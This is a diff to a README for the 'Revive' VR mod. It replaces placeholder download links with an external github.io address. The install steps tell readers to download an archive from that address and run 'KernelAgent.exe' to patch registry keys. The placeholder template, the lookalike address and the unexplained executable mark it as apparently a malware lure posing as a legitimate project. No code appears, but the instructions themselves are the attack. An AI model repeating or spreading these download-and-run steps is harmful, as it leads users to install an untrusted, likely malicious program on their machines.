@@ -2,13 +2,15 @@
 
 Revive is a VR compatibility mod that allows you to play Oculus-exclusive titles on any SteamVR-compatible headset. This tool unlocks access to the Oculus platform through OpenVR (Valve Index, HTC Vive, WMR, Pimax, etc).
 
-[![Download Revive](https://img.shields.io/badge/Download-Revive_VR_Mod-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Revive](https://img.shields.io/badge/Download-Revive_VR_Mod-blueviolet)](https://revive-vr-mod-oculus-to-steamvr.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://revive-vr-mod-oculus-to-steamvr.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\Revive`)  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required to patch SteamVR integration and registry keys)  
 4. 🎮 Launch SteamVR, then inject your Oculus game using the Revive Injector  
